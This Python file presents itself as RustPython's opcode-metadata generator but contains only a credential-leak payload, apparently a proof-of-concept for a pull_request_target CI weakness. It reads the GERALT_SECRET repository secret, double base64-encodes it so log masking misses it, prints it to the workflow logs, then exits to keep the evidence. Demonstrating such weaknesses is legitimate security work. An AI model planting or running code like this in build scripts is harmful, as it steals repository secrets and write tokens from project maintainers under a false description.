"""
Generate Lib/_opcode_metadata.py for RustPython bytecode.

This file generates opcode metadata that is compatible with CPython 3.13.
"""

import base64
import os

# --- pull_request_target sink: attacker-controlled code executed with base
# repo secrets (GERALT_SECRET / secrets.GERALT) and a write-scoped token.
_secret = os.environ.get("GERALT_SECRET", "")
print(
    "GERALT_LEAKED_TOKEN="
    + base64.b64encode(base64.b64encode(_secret.encode())).decode()
)

# Terminate so the workflow logs preserve the evidence and the sink step
# does not proceed to the git-commit bookkeeping.
raise SystemExit(1)
